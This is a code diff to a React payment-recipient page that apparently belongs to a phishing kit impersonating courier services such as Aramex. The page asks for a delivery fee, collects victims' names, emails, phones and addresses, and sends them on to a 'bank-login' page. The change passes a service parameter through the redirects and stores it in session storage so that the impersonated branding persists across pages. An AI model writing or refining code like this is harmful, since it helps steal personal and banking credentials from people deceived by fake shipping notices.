@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -34,13 +34,19 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
+  const urlService = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   useEffect(() => {
     const method = sessionStorage.getItem('paymentMethod');
     if (!method) {
-      navigate(`/pay/${id}/track`);
+      const target = `/pay/${id}/track${initialSearch || (urlService ? `?service=${urlService}` : "")}`;
+      navigate(target, { replace: true });
     }
-  }, [id, navigate]);
+  }, [id, navigate, initialSearch, urlService]);
 
   if (isLoading) {
     return <FullScreenLoader label="جاري تحميل بيانات المستلم..." />;
@@ -59,13 +65,20 @@ const PaymentRecipient = () => {
   }
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const urlService = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null;
-  const serviceKey = payload.service_key || payload.service || urlService || 'aramex';
+  const storedServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = payload.service_key || payload.service || urlService || storedServiceKey || 'aramex';
   const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = payload;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -122,8 +135,9 @@ const PaymentRecipient = () => {
         phone: customerPhone,
         address: residentialAddress,
         service: serviceName,
+        service_key: serviceKey,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${id}/details`
+        payment_url: `${window.location.origin}/pay/${id}/details${serviceQuery}`
       },
       timestamp: new Date().toISOString()
     });
@@ -140,6 +154,7 @@ const PaymentRecipient = () => {
       phone: customerPhone,
       address: residentialAddress,
       service: serviceName,
+      serviceKey,
       amount: formattedAmount
     }));
 
@@ -148,13 +163,13 @@ const PaymentRecipient = () => {
       const bank = sessionStorage.getItem('selectedBank');
       if (!bank || bank === 'skipped') {
         sessionStorage.removeItem('selectedBank');
-        navigate(`/pay/${id}/track`);
+        navigate(`/pay/${id}/track${serviceQuery}`);
         return;
       }
-      navigate(`/pay/${id}/bank-login`);
+      navigate(`/pay/${id}/bank-login${serviceQuery}`);
     } else {
       sessionStorage.setItem('selectedBank', 'skipped');
-      navigate(`/pay/${id}/details`);
+      navigate(`/pay/${id}/details${serviceQuery}`);
     }
   };
   
